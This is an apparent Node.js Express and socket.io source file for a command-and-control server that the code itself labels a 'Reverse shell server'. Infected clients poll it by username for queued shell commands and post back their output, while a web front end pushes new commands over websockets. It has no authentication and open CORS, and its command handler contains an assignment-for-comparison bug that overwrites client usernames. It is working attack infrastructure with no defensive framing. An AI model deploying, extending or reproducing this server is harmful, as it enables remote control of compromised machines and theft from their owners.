const express = require('express')
const bodyParser = require('body-parser')
const cors = require('cors')
const socketio = require('socket.io');
const path = require('path');
const http = require('http');


const port = 18000;
process.env.TZ = 'Asia/Tokyo';


const app = express();
app.use(bodyParser.urlencoded({limit: '50mb',extended: true}));
app.use(express.static(path.join(__dirname, 'dist')));
app.use(cors());

var http_server = http.createServer(app);
var io = socketio(http_server);

var client_commands = []

app.post('/cmd', (req, res) => {
  console.log(`${req.body.username} requested a command`)

  // Check if the client is known already
  let client = client_commands.find(element => element.username === req.body.username );

  if(!client) {
    client = {
      username: req.body.username,
      command: "standby"
    }
    client_commands.push(client)
  }


  // timestamp the connection
  client.last_seen = new Date();

  // Send the client to the front end
  io.emit('request',client)

  // send the command to the client
  res.send(client.command)

  // Set the next command to standby, which does nothing on the client side
  client.command = 'standby';

})

app.post('/response', (req, res) => {
  console.log(`${req.body.username} provided a response`)
  res.send("OK");

  // Could execute next command here to increase speed
  let client = client_commands.find(element => element.username === req.body.username );

  // if found
  if(client) {
    console.log(client)
    client.response = req.body.output;
    io.emit('response',client)
  }

})



io.on('connection', (socket) => {
  console.log('[WS] Client connected')

  socket.on('new_command', payload => {
    console.log("new command")
    if('username' in payload) {
      // find client
      let client = client_commands.find(element => element.username = payload.username );

      // set the new command
      client.command = payload.command;
    }
  })

});

http_server.listen(port, () => console.log(`Reverse shell server listening on ${port}!`))
